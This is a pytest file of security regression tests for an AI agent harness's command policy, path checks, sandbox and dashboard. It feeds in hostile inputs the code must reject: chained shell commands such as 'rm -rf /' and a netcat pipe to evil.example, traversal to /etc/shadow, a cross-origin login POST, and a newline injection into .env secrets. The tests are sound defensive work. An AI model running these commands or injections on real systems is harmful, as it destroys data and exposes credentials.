"""Security audit regression tests for policy, sandbox, gates, and web dashboard."""

from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from harness.audit.chain import AuditChain
from harness.audit.store import StateStore
from harness.config import RiskTier, default_config, init_workspace
from harness.dashboard import create_dashboard_app
from harness.gitops import GateRunner
from harness.policy import PolicyEngine, PolicyOutcome
from harness.sandbox import SandboxError, SandboxManager


def test_command_policy_blocks_shell_chaining_and_metacharacters(tmp_path: Path) -> None:
    cfg = default_config("sec-cmd", "AI-001")
    engine = PolicyEngine(cfg, AuditChain(tmp_path / "audit.jsonl"))

    for malicious in (
        "pytest; rm -rf /",
        "pytest && curl https://evil.example",
        "pytest | nc evil.example 4444",
        "pytest $(id)",
        "pytest `whoami`",
        "pytest\nrm -rf /",
    ):
        dec = engine.evaluate_command(malicious)
        assert dec.outcome == PolicyOutcome.DENY
        assert dec.rule_id == "command.shell_metacharacter"


def test_path_policy_blocks_traversal_and_normalises_dot_slash(tmp_path: Path) -> None:
    cfg = default_config("sec-path", "AI-001")
    engine = PolicyEngine(cfg, AuditChain(tmp_path / "audit.jsonl"))

    trav = engine.evaluate_paths_and_diff(["../../etc/passwd"], diff_lines=1, risk_tier=RiskTier.LOW)
    assert trav.outcome == PolicyOutcome.DENY
    assert trav.rule_id == "paths.traversal_denied"

    abs_p = engine.evaluate_paths_and_diff(["/etc/shadow"], diff_lines=1, risk_tier=RiskTier.LOW)
    assert abs_p.outcome == PolicyOutcome.DENY

    dot_env = engine.evaluate_paths_and_diff(["./.env"], diff_lines=1, risk_tier=RiskTier.LOW)
    assert dot_env.outcome == PolicyOutcome.REQUIRE_APPROVAL
    assert dot_env.rule_id == "paths.restricted"


def test_worktree_rejects_invalid_task_id(tmp_path: Path) -> None:
    cfg = default_config("sec-wt", "AI-001")
    mgr = SandboxManager(cfg, AuditChain(tmp_path / "audit.jsonl"), StateStore(tmp_path / "state.db"), tmp_path)
    with pytest.raises(SandboxError, match="Invalid task_id"):
        mgr.prepare_worktree("../escape")


def test_gate_runner_ignores_paths_outside_repo_root(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    outside = tmp_path / "outside.py"
    outside.write_text('API_KEY = "sk-proj-1234567890abcdefghijklmnop"\n', encoding="utf-8")

    cfg = default_config("sec-gate", "AI-001")
    runner = GateRunner(cfg, AuditChain(repo / "audit.jsonl"), repo)
    assert runner._iter_source_files(["../outside.py"]) == []


def test_dashboard_security_headers_csrf_ratelimit_and_dotenv_injection(tmp_path: Path) -> None:
    cfg_path, _cfg, _ = init_workspace(root=tmp_path, project_name="sec-web", asset_code="AI-001")
    client = TestClient(create_dashboard_app(cfg_path, auth_enabled=True, auth_token="secret-123"))

    # Security headers present
    login_get = client.get("/login")
    assert login_get.headers.get("x-content-type-options") == "nosniff"
    assert login_get.headers.get("x-frame-options") == "DENY"

    # Cross-origin POST rejected
    csrf_resp = client.post(
        "/login",
        data={"token": "secret-123"},
        headers={"Origin": "https://evil.example", "Host": "127.0.0.1:8787"},
    )
    assert csrf_resp.status_code == 403

    # Rate limit after 5 failed logins
    for _ in range(5):
        r = client.post("/login", data={"token": "wrong"})
        assert r.status_code == 401
    limited = client.post("/login", data={"token": "wrong"})
    assert limited.status_code == 429

    # Newline injection in .env secrets rejected
    auth_client = TestClient(create_dashboard_app(cfg_path, auth_enabled=False))
    inj_resp = auth_client.post(
        "/config/secrets",
        data={"secret_AGNES_API_KEY": "abc\nHARNESS_DASHBOARD_TOKEN=pwned"},
        follow_redirects=False,
    )
    assert inj_resp.status_code == 303
    assert "err=" in inj_resp.headers["location"]
    assert not (tmp_path / ".env").exists()
